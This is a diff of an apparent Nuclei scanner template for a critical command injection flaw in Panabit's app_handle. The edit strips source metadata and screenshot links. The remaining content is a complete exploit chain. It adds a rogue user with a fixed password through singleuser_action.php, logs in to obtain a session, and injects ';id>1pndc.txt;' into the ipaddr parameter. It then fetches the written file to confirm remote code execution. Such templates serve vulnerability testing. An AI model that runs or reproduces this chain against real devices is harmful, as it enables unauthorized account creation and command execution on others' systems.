@@ -3,12 +3,8 @@ info:
   name: panabit app_handle存在命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vthucz7x5g1qbdqv'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vthucz7x5g1qbdqv
-    fofa: app="Panabit-Panalog"
 http:
 - raw:
   - 'POST /singleuser_action.php HTTP/1.1
@@ -34,7 +30,7 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-    { "syncInfo": { "user": { "userId": "88172765", "userName": "88172765", "employeeId": "88172765", "departmentId": "88172765", "departmentName": "88172765", "coporationId": "88172765", "corporationName": "88172765", "userSex": "1",  "userDuty": "88172765", "userBirthday": "88172765", "userPost": "88172765", "userPostCode": "88172765", "userAlias": "88172765", "userRank": "88172765", "userPhone": "88172765", "userHomeAddress": "88172765", "userMobilePhone": "88172765", "userMailAddress": "88172765", "userMSN": "88172765", "userNt": "88172765", "userCA": "88172765", "userPwd": "88172765", "userClass": "88172765", "parentId": "88172765", "bxlx": "88172765" },"operationType": "ADD_USER" } }![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1766319393318-7bcd3fa4-2e06-40c0-9d6b-63e904773262.png)
+    { "syncInfo": { "user": { "userId": "88172765", "userName": "88172765", "employeeId": "88172765", "departmentId": "88172765", "departmentName": "88172765", "coporationId": "88172765", "corporationName": "88172765", "userSex": "1",  "userDuty": "88172765", "userBirthday": "88172765", "userPost": "88172765", "userPostCode": "88172765", "userAlias": "88172765", "userRank": "88172765", "userPhone": "88172765", "userHomeAddress": "88172765", "userMobilePhone": "88172765", "userMailAddress": "88172765", "userMSN": "88172765", "userNt": "88172765", "userCA": "88172765", "userPwd": "88172765", "userClass": "88172765", "parentId": "88172765", "bxlx": "88172765" },"operationType": "ADD_USER" } }
 
 
     **登录获取可用PHPSESSID**'
@@ -79,7 +75,7 @@ http:
     X-Requested-With: XMLHttpRequest
 
 
-    user=88172765&mypass=88172765![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1766319393597-ea59e60d-d7b2-423d-b387-45273a0592d6.png)
+    user=88172765&mypass=88172765
 
     **命令注入点执行**'
   redirects: false
@@ -107,8 +103,6 @@ http:
 
     type=wlist_ipdetail&ipaddr=;id>1pndc.txt;
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1766319393901-b6381ba1-8a2f-4a18-8108-4724afe3ddc4.png)
-
 
     **写入目录执行验证**'
   redirects: false
@@ -119,9 +113,7 @@ http:
 - raw:
   - 'GET /App/1pndc.txt HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1766319394099-196921fe-7964-43a9-9b72-f8065e25754d.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
